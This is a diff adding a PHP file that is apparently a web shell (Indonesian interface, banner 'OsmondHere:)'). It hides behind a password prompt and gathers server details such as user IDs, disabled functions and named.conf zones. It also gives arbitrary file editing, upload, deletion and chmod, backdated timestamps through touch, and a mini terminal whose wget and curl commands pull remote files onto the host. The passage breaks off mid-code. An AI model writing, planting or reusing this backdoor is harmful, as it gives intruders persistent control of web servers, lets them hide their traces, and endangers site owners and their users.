@@ -1,0 +1,1195 @@
+<?php
+session_start();
+
+$PASSWORD_HASH = '$2y$10$XuDuOjo0LyzzT7LUmzQo7eNdV1/wcgtT6ezAlkQ/AtRw7xDRX0TmG';
+$startDir = realpath(__DIR__);
+
+if (isset($_GET["logout"])) {
+    session_unset();
+    session_destroy();
+    header("Location: https://www.google.com/");
+    exit();
+}
+
+if (isset($_POST["password"])) {
+    $passInput = $_POST["password"];
+
+    if (password_verify($passInput, $PASSWORD_HASH)) {
+        $_SESSION["logged_in"] = true;
+    } else {
+        $error = "Password salah!";
+    }
+}
+
+if (!isset($_SESSION["logged_in"])) {
+    echo "<h4>!@#$%^&*()_+</h4>";
+    if (isset($error)) {
+        echo "<p style='color:red'>$error</p>";
+    }
+    echo "<form method='POST'>
+            <input type='password' name='password' placeholder='!@#$%'>
+            <button type='submit'>Login</button>
+          </form>";
+    exit();
+}
+
+$path = isset($_GET["path"]) ? realpath($_GET["path"]) : $startDir;
+if ($path === false) {
+    $path = $startDir;
+}
+
+if (isset($_GET["delete"])) {
+    $target = realpath($path . "/" . $_GET["delete"]);
+    if ($target) {
+        if (is_dir($target)) {
+            @rmdir($target);
+        } else {
+            @unlink($target);
+        }
+    }
+    header("Location: ?path=" . encode_path($path));
+    exit();
+}
+
+if (isset($_POST["rename_old"]) && isset($_POST["rename_new"])) {
+    @rename(
+        $path . "/" . $_POST["rename_old"],
+        $path . "/" . $_POST["rename_new"]
+    );
+    header("Location: ?path=" . encode_path($path));
+    exit();
+}
+
+if (isset($_POST["new_folder"]) && $_POST["new_folder"] !== "") {
+    @mkdir($path . "/" . $_POST["new_folder"]);
+    header("Location: ?path=" . encode_path($path));
+    exit();
+}
+
+if (isset($_POST["new_file"]) && $_POST["new_file"] !== "") {
+    @file_put_contents($path . "/" . $_POST["new_file"], "");
+    header("Location: ?path=" . encode_path($path));
+    exit();
+}
+
+if (isset($_GET["edit"])) {
+    $file = $path . "/" . $_GET["edit"];
+    if (isset($_POST["content"])) {
+        file_put_contents($file, $_POST["content"]);
+        echo "<p style='color:green'>File berhasil disimpan!</p>";
+    }
+    echo "<h2>Editing: " . htmlspecialchars($_GET["edit"]) . "</h2>";
+    echo "<form method='POST'>
+            <textarea name='content' style='width:100%;height:400px;'>" .
+        htmlspecialchars(@file_get_contents($file)) .
+        "</textarea><br>
+         <button>Save</button>
+         </form>
+         <p><a href='?path=" .
+        htmlspecialchars($path) .
+        "'>← Back</a></p>";
+    exit();
+}
+
+if (isset($_POST["touch_target"]) && isset($_POST["touch_time"])) {
+    $ts = strtotime($_POST["touch_time"]);
+    if ($ts !== false) {
+        @touch($path . "/" . $_POST["touch_target"], $ts);
+    }
+    header("Location: ?path=" . encode_path($path));
+    exit();
+}
+
+if (
+    isset($_POST["chmod_file"]) &&
+    isset($_POST["new_mode"]) &&
+    $_POST["new_mode"] !== ""
+) {
+    @chmod($path . "/" . $_POST["chmod_file"], octdec($_POST["new_mode"]));
+    header("Location: ?path=" . encode_path($path));
+    exit();
+}
+
+if (isset($_FILES["upload_file"]) && !empty($_FILES["upload_file"]["name"])) {
+    $dest = $path . "/" . basename($_FILES["upload_file"]["name"]);
+    @move_uploaded_file($_FILES["upload_file"]["tmp_name"], $dest);
+    header("Location: ?path=" . encode_path($path));
+    exit();
+}
+
+if (isset($_GET["download"])) {
+    $file = realpath($path . "/" . $_GET["download"]);
+    if ($file && is_file($file) && strpos($file, $path) === 0) {
+        $basename = basename($file);
+        $size = filesize($file);
+
+        header("Content-Description: File Transfer");
+        header("Content-Type: application/octet-stream");
+        header('Content-Disposition: attachment; filename="' . $basename . '"');
+        header("Content-Length: " . $size);
+        header("Cache-Control: must-revalidate");
+        header("Pragma: public");
+        readfile($file);
+        exit();
+    }
+    header("Location: ?path=" . encode_path($path));
+    exit();
+}
+
+if (!function_exists("human_filesize")) {
+    function human_filesize($bytes)
+    {
+        if ($bytes === false || $bytes < 0) {
+            return "-";
+        }
+        $units = ["B", "KB", "MB", "GB", "TB"];
+        $i = 0;
+        while ($bytes >= 1024 && $i < count($units) - 1) {
+            $bytes /= 1024;
+            $i++;
+        }
+        return round($bytes, 2) . " " . $units[$i];
+    }
+}
+
+function is_simple_name($name)
+{
+    if ($name === "" || $name === "." || $name === "..") {
+        return false;
+    }
+    if (strpos($name, "/") !== false) {
+        return false;
+    }
+    if (strpos($name, "\\") !== false) {
+        return false;
+    }
+    if (strpos($name, "..") !== false) {
+        return false;
+    }
+    return true;
+}
+
+function encode_path($p)
+{
+    $p = str_replace("\\", "/", $p);
+
+    $p = preg_replace("~/+~", "/", $p);
+
+    $parts = explode("/", $p);
+    $parts = array_map("rawurlencode", $parts);
+    return implode("/", $parts);
+}
+
+$dlStatus = "";
+$commandOutput = "";
+
+function run_single_command($cmdLine, $path, &$statusPart, &$outputPart)
+{
+    $statusPart = "";
+    $outputPart = "";
+    $cmdLine = trim($cmdLine);
+
+    if ($cmdLine === "") {
+        $statusPart = "Perintah kosong.";
+        return;
+    }
+
+    $tokens = preg_split("/\s+/", $cmdLine);
+    $prog = strtolower($tokens[0]);
+
+    if ($prog === "wget") {
+        if (count($tokens) < 2) {
+            $statusPart = "Format wget: wget URL -O file";
+        } else {
+            $url = $tokens[1];
+            $save = "";
+
+            $count = count($tokens);
+            for ($i = 2; $i < $count; $i++) {
+                $t = strtolower($tokens[$i]);
+                if (($t === "-o" || $t === "-O") && isset($tokens[$i + 1])) {
+                    $save = $tokens[$i + 1];
+                    $i++;
+                }
+            }
+
+            if ($save === "") {
+                $pathPart = parse_url($url, PHP_URL_PATH);
+                $base = basename($pathPart);
+                if ($base === "" || $base === "/") {
+                    $base = "download_" . time();
+                }
+                $save = $base;
+            }
+
+            if (!is_simple_name($save)) {
+                $statusPart = "Nama file tidak valid untuk wget.";
+            } else {
+                $data = @file_get_contents($url);
+                if ($data === false) {
+                    $statusPart = "Wget gagal: " . htmlspecialchars($url);
+                } else {
+                    if (
+                        @file_put_contents($path . "/" . $save, $data) !== false
+                    ) {
+                        $statusPart = "Wget OK → " . htmlspecialchars($save);
+                    } else {
+                        $statusPart =
+                            "Gagal menyimpan file ke direktori saat ini.";
+                    }
+                }
+            }
+        }
+    } elseif ($prog === "curl") {
+        $url = "";
+        $save = "";
+        $count = count($tokens);
+
+        for ($i = 1; $i < $count; $i++) {
+            $t = $tokens[$i];
+
+            if (strtolower($t) === "-o" && isset($tokens[$i + 1])) {
+                $save = $tokens[$i + 1];
+                $i++;
+                continue;
+            }
+
+            if ($t !== "" && $t[0] !== "-") {
+                $url = $t;
+            }
+        }
+
+        if ($url === "") {
+            $statusPart = "Format curl: curl URL  ATAU  curl -o file URL";
+        } else {
+            $ctx = stream_context_create([
+                "http" => [
+                    "method" => "GET",
+                    "timeout" => 10,
+                ],
+            ]);
+            $data = @file_get_contents($url, false, $ctx);
+            if ($data === false) {
+                $statusPart = "Curl gagal: " . htmlspecialchars($url);
+            } else {
+                if ($save !== "") {
+                    if (!is_simple_name($save)) {
+                        $statusPart = "Nama file tidak valid untuk curl -o.";
+                    } else {
+                        if (
+                            @file_put_contents($path . "/" . $save, $data) !==
+                            false
+                        ) {
+                            $statusPart =
+                                "Curl download OK → " . htmlspecialchars($save);
+                        } else {
+                            $statusPart = "Curl gagal menyimpan file.";
+                        }
+                    }
+                } else {
+                    if (strlen($data) > 5000) {
+                        $outputPart =
+                            substr($data, 0, 5000) . "\n... [truncated]";
+                    } else {
+                        $outputPart = $data;
+                    }
+                    $statusPart = "Curl preview OK (tidak disimpan ke file).";
+                }
+            }
+        }
+    } elseif ($prog === "ls" || $prog === "dir") {
+        $detailed = false;
+        foreach ($tokens as $t) {
+            if (strpos($t, "-") === 0) {
+                $detailed = true;
+            }
+        }
+
+        $scan = scandir($path);
+        $lines = [];
+        foreach ($scan as $name) {
+            if ($name === ".") {
+                continue;
+            }
+            $full = $path . "/" . $name;
+            if (!file_exists($full)) {
+                continue;
+            }
+
+            $isDir = is_dir($full) ? "d" : "-";
+            $perm = substr(sprintf("%o", @fileperms($full)), -4);
+            $size = is_dir($full) ? "-" : human_filesize(@filesize($full));
+            $mtime = @filemtime($full);
+            $time = $mtime ? date("Y-m-d H:i:s", $mtime) : "-";
+
+            if ($detailed) {
+                $lines[] = sprintf(
+                    "%s %s %8s %16s %s",
+                    $isDir,
+                    $perm,
+                    $size,
+                    $time,
+                    $name
+                );
+            } else {
+                $lines[] = $name;
+            }
+        }
+        $outputPart = implode("\n", $lines);
+        $statusPart = "Output untuk: " . htmlspecialchars($cmdLine);
+    } elseif ($prog === "mkdir") {
+        if (count($tokens) < 2) {
+            $statusPart = "Format mkdir: mkdir nama_dir";
+        } else {
+            $name = $tokens[1];
+            if (!is_simple_name($name)) {
+                $statusPart = "Nama folder tidak valid.";
+            } else {
+                if (@mkdir($path . "/" . $name)) {
+                    $statusPart = "mkdir OK: " . htmlspecialchars($name);
+                } else {
+                    $statusPart = "mkdir gagal.";
+                }
+            }
+        }
+    } elseif ($prog === "touch") {
+        if (count($tokens) < 2) {
+            $statusPart = "Format touch: touch nama_file";
+        } else {
+            $name = $tokens[1];
+            if (!is_simple_name($name)) {
+                $statusPart = "Nama file tidak valid.";
+            } else {
+                if (@touch($path . "/" . $name)) {
+                    $statusPart = "touch OK: " . htmlspecialchars($name);
+                } else {
+                    $statusPart = "touch gagal.";
+                }
+            }
+        }
+    } elseif ($prog === "rm") {
+        if (count($tokens) < 2) {
+            $statusPart = "Format rm: rm nama_file";
+        } else {
+            $name = $tokens[1];
+            if (!is_simple_name($name)) {
+                $statusPart = "Nama target tidak valid.";
+            } else {
+                $target = realpath($path . "/" . $name);
+                if (
+                    $target &&
+                    strpos($target, $path) === 0 &&
+                    file_exists($target)
+                ) {
+                    if (is_dir($target)) {
+                        $ok = @rmdir($target);
+                    } else {
+                        $ok = @unlink($target);
+                    }
+                    $statusPart = $ok
+                        ? "rm OK: " . htmlspecialchars($name)
+                        : "rm gagal.";
+                } else {
+                    $statusPart = "Target tidak ditemukan.";
+                }
+            }
+        }
+    } elseif ($prog === "chmod") {
+        if (count($tokens) < 3) {
+            $statusPart = "Format chmod: chmod 0755 nama_file";
+        } else {
+            $mode = $tokens[1];
+            $name = $tokens[2];
+            if (!is_simple_name($name)) {
+                $statusPart = "Nama target tidak valid.";
+            } else {
+                $target = $path . "/" . $name;
+                if (!file_exists($target)) {
+                    $statusPart = "Target chmod tidak ditemukan.";
+                } else {
+                    $ok = @chmod($target, octdec($mode));
+                    $statusPart = $ok
+                        ? "chmod OK: " .
+                            htmlspecialchars($mode) .
+                            " " .
+                            htmlspecialchars($name)
+                        : "chmod gagal.";
+                }
+            }
+        }
+    } elseif ($prog === "cd") {
+        if (count($tokens) < 2) {
+            $statusPart = "Format cd: cd folder";
+        } else {
+            $target = $tokens[1];
+
+            if ($target === "..") {
+                $newPath = dirname($path);
+            } else {
+                $newPath = realpath($path . "/" . $target);
+            }
+
+            if ($newPath && is_dir($newPath)) {
+                header("Location: ?path=" . encode_path($newPath));
+                exit();
+            } else {
+                $statusPart = "cd gagal: folder tidak ditemukan.";
+            }
+        }
+    } elseif ($prog === "pwd") {
+        $statusPart = "Current directory: " . htmlspecialchars($path);
+    } elseif ($prog === "mv") {
+        if (count($tokens) < 3) {
+            $statusPart = "Format mv: mv sumber target";
+        } else {
+            $src = $tokens[1];
+            $dst = $tokens[2];
+
+            if (!is_simple_name($src) || !is_simple_name($dst)) {
+                $statusPart = "Nama file tidak valid untuk mv.";
+            } else {
+                $srcFull = $path . "/" . $src;
+                $dstFull = $path . "/" . $dst;
+
+                if (!file_exists($srcFull)) {
+                    $statusPart = "mv gagal: sumber tidak ditemukan.";
+                } else {
+                    if (@rename($srcFull, $dstFull)) {
+                        $statusPart =
+                            "mv OK: " .
+                            htmlspecialchars($src) .
+                            " → " .
+                            htmlspecialchars($dst);
+                    } else {
+                        $statusPart = "mv gagal.";
+                    }
+                }
+            }
+        }
+    } elseif ($prog === "whoami") {
+        $u = @get_current_user();
+        $outputPart = "User: " . $u;
+        $statusPart = "Output whoami.";
+    } elseif ($prog === "id") {
+        if (function_exists("posix_getuid")) {
+            $uid = posix_getuid();
+            $gid = posix_getgid();
+            $pw = @posix_getpwuid($uid);
+            $gr = @posix_getgrgid($gid);
+
+            $uname = $pw && isset($pw["name"]) ? $pw["name"] : $uid;
+            $gname = $gr && isset($gr["name"]) ? $gr["name"] : $gid;
+
+            $outputPart = "uid=$uid($uname) gid=$gid($gname)";
+        } else {
+            $outputPart =
+                "Extension posix tidak tersedia. get_current_user(): " .
+                @get_current_user();
+        }
+        $statusPart = "Output id.";
+    } else {
+        $statusPart = "Perintah tidak didukung: " . htmlspecialchars($prog);
+    }
+}
+
+if (isset($_POST["dl_cmd"]) && trim($_POST["dl_cmd"]) !== "") {
+    $input = $_POST["dl_cmd"];
+
+    $cmdChunks = preg_split("/&&|;/", $input);
+
+    $statusList = [];
+    $outputList = [];
+
+    foreach ($cmdChunks as $chunk) {
+        $chunk = trim($chunk);
+        if ($chunk === "") {
+            continue;
+        }
+
+        $s = "";
+        $o = "";
+
+        run_single_command($chunk, $path, $s, $o);
+
+        if ($s !== "") {
+            $statusList[] = $s . " [ " . htmlspecialchars($chunk) . " ]";
+        }
+        if ($o !== "") {
+            $outputList[] = $o;
+        }
+    }
+
+    if (!empty($statusList)) {
+        $dlStatus = implode("<br>", $statusList);
+    }
+    if (!empty($outputList)) {
+        $commandOutput = implode("\n", $outputList);
+    }
+}
+
+if (
+    isset($_POST["bulk_action"]) &&
+    !empty($_POST["bulk_action"]) &&
+    isset($_POST["bulk_items"]) &&
+    is_array($_POST["bulk_items"])
+) {
+    $bulkAction = $_POST["bulk_action"];
+    $bulkValue = isset($_POST["bulk_value"]) ? $_POST["bulk_value"] : "";
+
+    foreach ($_POST["bulk_items"] as $name) {
+        if (!is_simple_name($name)) {
+            continue;
+        }
+        $target = $path . "/" . $name;
+        if (!file_exists($target)) {
+            continue;
+        }
+
+        if ($bulkAction === "chmod") {
+            $mode = trim($bulkValue);
+            if (preg_match('/^[0-7]{3,4}$/', $mode)) {
+                @chmod($target, octdec($mode));
+            }
+        } elseif ($bulkAction === "touch") {
+            $ts = strtotime($bulkValue);
+            if ($ts !== false) {
+                @touch($target, $ts);
+            }
+        } elseif ($bulkAction === "delete") {
+            if (is_dir($target)) {
+                @rmdir($target);
+            } else {
+                @unlink($target);
+            }
+        } elseif ($bulkAction === "rename_prefix") {
+            $prefix = $bulkValue;
+            if ($prefix !== "") {
+                $newName = $prefix . $name;
+                if (is_simple_name($newName)) {
+                    @rename($target, $path . "/" . $newName);
+                }
+            }
+        } elseif ($bulkAction === "rename_suffix") {
+            $suffix = $bulkValue;
+            if ($suffix !== "") {
+                $dotPos = strrpos($name, ".");
+                if ($dotPos !== false) {
+                    $base = substr($name, 0, $dotPos);
+                    $ext = substr($name, $dotPos);
+                    $newName = $base . $suffix . $ext;
+                } else {
+                    $newName = $name . $suffix;
+                }
+                if (is_simple_name($newName)) {
+                    @rename($target, $path . "/" . $newName);
+                }
+            }
+        }
+    }
+
+    header("Location: ?path=" . encode_path($path));
+    exit();
+}
+
+echo "<style>
+body{font-family:Arial,sans-serif;font-size:13px;background:#f3f3f3;color:#222;margin:10px}
+h2,h3{margin:8px 0 4px;font-weight:600}
+p{margin:3px 0}
+ul{list-style:none;padding-left:0;margin:0;border-top:2px solid #bbb}
+li{
+    margin:0;
+    padding:4px 6px;
+    line-height:1.3em;
+    display:grid;
+    grid-template-columns:24px 320px 80px 140px 140px 150px 50px 90px 190px 80px;
+    align-items:center;
+    border-bottom:2px solid #ccc;
+    background:#fff
+}
+li:nth-child(even){background:#f9f9f9}
+li:hover{background:#e6f4ff}
+.grid-header{font-weight:700;background:#ddd!important}
+.grid-header:hover{background:#ddd!important}
+a{color:#06c;text-decoration:none;font-weight:500}
+a:hover{color:#004c99;text-decoration:underline}
+form{display:inline;margin:0}
+input[type=password],input[type=text],textarea{font-size:12px;padding:3px 5px;margin-right:4px;border:1px solid #aaa;border-radius:3px}
+textarea{font-family:monospace;height:420px}
+button{font-size:12px;padding:3px 8px;margin-left:2px;border:1px solid #666;border-radius:3px;background:#e6e6e6;cursor:pointer}
+button:hover{background:#d5d5d5}
+div{margin:2px 0}
+hr{margin:6px 0;border:0;border-top:2px solid #bbb}
+.action-row{background:#f5f5f5}
+.action-row div{margin:1px 0}
+.writable{color:green;font-weight:600}
+.readonly{color:#b30000;font-weight:600}
+.status-msg{margin:5px 0;padding:5px 8px;border-radius:3px;background:#eef3ff;border:1px solid #9af;font-size:12px}
+.curl-box{margin-top:4px;width:100%;max-width:800px;height:150px;font-family:monospace;font-size:11px;white-space:pre;overflow:auto}
+li>div:nth-child(2){white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+</style>";
+
+$uname = php_uname();
+
+$userId = function_exists("posix_getuid") ? posix_getuid() : get_current_user();
+$groupId = function_exists("posix_getgid") ? posix_getgid() : "?";
+
+$userName = $userId;
+$groupName = $groupId;
+
+if (function_exists("posix_getpwuid") && is_int($userId)) {
+    $pw = @posix_getpwuid($userId);
+    if ($pw && isset($pw["name"])) {
+        $userName = $pw["name"];
+    }
+}
+if (function_exists("posix_getgrgid") && is_int($groupId)) {
+    $gr = @posix_getgrgid($groupId);
+    if ($gr && isset($gr["name"])) {
+        $groupName = $gr["name"];
+    }
+}
+
+$phpVersion = PHP_VERSION;
+$safeModeIni = ini_get("safe_mode");
+$safeMode = !empty($safeModeIni) && $safeModeIni !== "0" ? "ON" : "OFF";
+
+$serverIp = isset($_SERVER["SERVER_ADDR"])
+    ? $_SERVER["SERVER_ADDR"]
+    : @gethostbyname(isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : "localhost");
+$clientIp = isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "0.0.0.0";
+
+$namedFile = "/etc/named.conf";
+if (@is_readable($namedFile)) {
+    $namedContent = @file(
+        $namedFile,
+        FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES
+    );
+    $domainCount = 0;
+    if (is_array($namedContent)) {
+        foreach ($namedContent as $line) {
+            if (strpos($line, "zone") !== false) {
+                $domainCount++;
+            }
+        }
+    }
+    $domainsInfo = "Zones: {$domainCount} [ {$namedFile} ]";
+} else {
+    $domainsInfo = "Cant Read [ {$namedFile} ]";
+}
+
+$diskPath = DIRECTORY_SEPARATOR === "\\" ? "C:" : "/";
+$totalDisk = @disk_total_space($diskPath);
+$freeDisk = @disk_free_space($diskPath);
+if ($totalDisk > 0) {
+    $totalGB = $totalDisk / (1024 * 1024 * 1024);
+    $freeGB = $freeDisk / (1024 * 1024 * 1024);
+    $percent = ($freeGB / $totalGB) * 100;
+    $hddInfo = sprintf(
+        "Total:%.2f GB Free:%.2f GB [%d%%]",
+        $totalGB,
+        $freeGB,
+        round($percent)
+    );
+} else {
+    $hddInfo = "N/A";
+}
+
+if (stripos(PHP_OS, "WIN") === 0) {
+    $windowsLine = "Microsoft Windows [Version " . php_uname("r") . "]";
+} else {
+    $windowsLine = php_uname("s") . " " . php_uname("r");
+}
+
+$curlOn = extension_loaded("curl") ? "ON" : "OFF";
+$mysqlOn =
+    extension_loaded("mysqli") || extension_loaded("mysqlnd") ? "ON" : "OFF";
+$mssqlOn = extension_loaded("sqlsrv") ? "ON" : "OFF";
+$pgsqlOn = extension_loaded("pgsql") ? "ON" : "OFF";
+$ociOn = extension_loaded("oci8") ? "ON" : "OFF";
+
+$magicQuotes =
+    function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc()
+        ? "ON"
+        : "OFF";
+
+$openBasedir = ini_get("open_basedir");
+$safeExecDir = ini_get("safe_mode_exec_dir");
+$safeInclDir = ini_get("safe_mode_include_dir");
+
+$openBasedir = $openBasedir !== "" ? $openBasedir : "NONE";
+$safeExecDir = $safeExecDir !== "" ? $safeExecDir : "NONE";
+$safeInclDir = $safeInclDir !== "" ? $safeInclDir : "NONE";
+
+$disabledFunctions = trim((string) ini_get("disable_functions"));
+if ($disabledFunctions === "") {
+    $disabledFunctions = "All Functions Accessible";
+}
+
+echo "<h2>OsmondHere:)</h2>";
+$now = date("Y-m-d H:i:s");
+$labelColor = "#0055aa";
+$onColor = "#008800";
+$offColor = "#cc0000";
+
+echo '<div style="font-family:Consolas,monospace;font-size:12px;background:#fff;border:1px solid #ccc;padding:6px 8px;margin:5px 0 10px;line-height:1.4em;">';
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Uname:</span> ' .
+    htmlspecialchars($uname) .
+    "<br>";
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">User:</span> ' .
+    htmlspecialchars((string) $userId) .
+    " [ " .
+    htmlspecialchars((string) $userName) .
+    " ] " .
+    '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;"> Group:</span> ' .
+    htmlspecialchars((string) $groupId) .
+    " [ " .
+    htmlspecialchars((string) $groupName) .
+    " ]<br>";
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">PHP:</span> ' .
+    htmlspecialchars($phpVersion) .
+    ' Safe Mode: <span style="color:' .
+    ($safeMode === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    htmlspecialchars($safeMode) .
+    "</span><br>";
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">DateTime:</span> ' .
+    htmlspecialchars($now) .
+    "<br>";
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">ServerIP:</span> ' .
+    htmlspecialchars($serverIp) .
+    ' <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Your IP:</span> ' .
+    htmlspecialchars($clientIp) .
+    "<br>";
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Domains:</span> ' .
+    htmlspecialchars($domainsInfo) .
+    "<br>";
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">HDD:</span> ' .
+    htmlspecialchars($hddInfo) .
+    "<br>";
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Windows:</span> ' .
+    htmlspecialchars($windowsLine) .
+    "<br>";
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Downloader:</span> -------------<br>';
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Disable Functions:</span> ' .
+    '<span style="color:' .
+    $offColor .
+    ';">' .
+    htmlspecialchars($disabledFunctions) .
+    "</span><br>";
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">CURL :</span> ' .
+    '<span style="color:' .
+    ($curlOn === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $curlOn .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">SSH2 :</span> ' .
+    '<span style="color:' .
+    (extension_loaded("ssh2") ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    (extension_loaded("ssh2") ? "ON" : "OFF") .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Magic Quotes :</span> ' .
+    '<span style="color:' .
+    ($magicQuotes === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $magicQuotes .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">MySQL :</span> ' .
+    '<span style="color:' .
+    ($mysqlOn === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $mysqlOn .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">MSSQL :</span> ' .
+    '<span style="color:' .
+    ($mssqlOn === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $mssqlOn .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">PostgreSQL :</span> ' .
+    '<span style="color:' .
+    ($pgsqlOn === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $pgsqlOn .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Oracle :</span> ' .
+    '<span style="color:' .
+    ($ociOn === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $ociOn .
+    "</span>" .
+    "<br>";
+
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Open_basedir :</span> ' .
+    htmlspecialchars($openBasedir) .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Safe_mode_exec_dir :</span> ' .
+    htmlspecialchars($safeExecDir) .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Safe_mode_include_dir :</span> ' .
+    htmlspecialchars($safeInclDir) .
+    "</div>";
+
+$scan = scandir($path);
+
+$dotdot = null;
+$dirs = [];
+$files = [];
+
+foreach ($scan as $f) {
+    if ($f === ".") {
+        continue;
+    }
+
+    $full = $path . "/" . $f;
+    if (!file_exists($full)) {
+        continue;
+    }
+
+    if ($f === "..") {
+        $dotdot = $f;
+        continue;
+    }
+
+    if (is_dir($full)) {
+        $dirs[] = $f;
+    } else {
+        $files[] = $f;
+    }
+}
+
+natcasesort($dirs);
+natcasesort($files);
+$dirs = array_values($dirs);
+$files = array_values($files);
+
+$entries = [];
+if ($dotdot !== null) {
+    $entries[] = $dotdot;
+}
+$entries = array_merge($entries, $dirs, $files);
+
+echo "<p><b>PWD:</b> ";
+
+$currentPath = realpath($path);
+
+$crumbs = [];
+$p = $currentPath;
+
+while ($p && $p !== dirname($p)) {
+    $crumbs[] = $p;
+    $p = dirname($p);
+}
+
+$crumbs[] = DIRECTORY_SEPARATOR;
+$crumbs = array_reverse($crumbs);
+
+$first = true;
+foreach ($crumbs as $pp) {
+    if (!$first) {
+        echo " / ";
+    }
+    $label = $pp === DIRECTORY_SEPARATOR ? "/" : basename($pp);
+    echo "<a href='?path=" .
+        htmlspecialchars(encode_path($pp), ENT_QUOTES) .
+        "'>" .
+        htmlspecialchars($label) .
+        "</a>";
+    $first = false;
+}
+
+echo "</p>";
+echo "<p><a href='?logout=1'>Logout</a></p>";
+echo "<p>
+    <a href='?path=" .
+    encode_path($startDir) .
+    "'>
+        Home
+    </a>
+</p>";
+
+$parent = realpath($path . "/..");
+if ($parent !== $path) {
+    echo "<p><a href='?path=" .
+        htmlspecialchars(encode_path($parent), ENT_QUOTES) .
+        "'>↑ Go Up</a></p>";
+}
+
+if ($dlStatus !== "") {
+    echo "<div class='status-msg'>" . $dlStatus . "</div>";
+}
+
+echo "<h3>Create New / Upload</h3>
+<form method='POST' style='display:inline'><input name='new_folder' placeholder='Folder name'><button>+ Folder</button></form>
+<form method='POST' style='display:inline;margin-left:10px;'><input name='new_file' placeholder='File name.txt'><button>+ File</button></form>
+<form method='POST' enctype='multipart/form-data' style='display:inline;margin-left:10px;'>
+    <input type='file' name='upload_file'>
+    <button>Upload</button>
+</form>
+<hr>";
+
+echo "<h3>Mini Terminal</h3>
+<form method='POST' style='display:inline'>
+    <input type='text' name='dl_cmd'
+           placeholder='!@#$%'
+           style='width:620px;'>
+    <button type='submit'>Kill</button>
+</form>";
+
+if ($commandOutput !== "") {
+    echo "<div><textarea class='curl-box'>" .
+        htmlspecialchars($commandOutput) .
+        "</textarea></div>";
+}
+
+echo "<hr>";
+
+echo "<h3>Bulk Action</h3>
+<form id='bulkForm' method='POST' style='margin-bottom:6px;'>
+    <select name='bulk_action'>
+        <option value=''>-- Pilih aksi --</option>
+        <option value='chmod'>Chmod (semua terpilih)</option>
+        <option value='touch'>Touch (ubah waktu)</option>
+        <option value='delete'>Delete</option>
+        <option value='rename_prefix'>Rename: tambah prefix</option>
+        <option value='rename_suffix'>Rename: tambah suffix</option>
+    </select>
+    <input type='text' name='bulk_value'
+           placeholder='0755 / 2025-12-31 12:00 / prefix_ / _old'
+           style='width:280px;'>
+    <button type='submit'>Apply ke yang tercentang</button>
+</form>";
+
+echo "<ul>
+<li class='grid-header'>
+    <div>Sel</div>
+    <div>Name</div>
+    <div>Size</div>
+    <div>Modified</div>
+    <div>Perm / RW</div>
+    <div>Owner / Group</div>
+    <div>Delete</div>
+    <div>Rename</div>
+    <div>View / Edit / Chmod / Download</div>
+    <div>Touch</div>
+</li>";
+
+foreach ($entries as $f) {
+    $full = $path . "/" . $f;
+    if (!file_exists($full)) {
+        continue;
+    }
+
+    $perm = substr(sprintf("%o", fileperms($full)), -4);
+    $id = md5($f);
+
+    if (is_dir($full)) {
+        $sizeHuman = "-";
+    } else {
+        $sizeHuman = human_filesize(@filesize($full));
+    }
+
+    $mtime = @filemtime($full);
+    $modified = $mtime ? date("Y-m-d H:i:s", $mtime) : "-";
+
+    $isWritable = is_writable($full);
+    $wrClass = $isWritable ? "writable" : "readonly";
+    $wrLabel = $isWritable ? "writable" : "readonly";
+
+    $ownerId = @fileowner($full);
+    $groupId = @filegroup($full);
+    $ownerName = $ownerId;
+    $groupName = $groupId;
+
+    if (function_exists("posix_getpwuid") && $ownerId !== false) {
+        $pw = @posix_getpwuid($ownerId);
+        if ($pw && isset($pw["name"])) {
+            $ownerName = $pw["name"];
+        }
+    }
+    if (function_exists("posix_getgrgid") && $groupId !== false) {
+        $gr = @posix_getgrgid($groupId);
+        if ($gr && isset($gr["name"])) {
+            $groupName = $gr["name"];
+        }
+    }
+
+    $permText = $perm . " / " . $wrLabel;
+    $ownerText = $ownerName . " / " . $groupName;
+
+    $viewUrl = "";
+    if (!is_dir($full)) {
+        $docRoot = realpath($_SERVER["DOCUMENT_ROOT"]);
+        $realFull = realpath($full);
+        if ($docRoot && $realFull && strpos($realFull, $docRoot) === 0) {
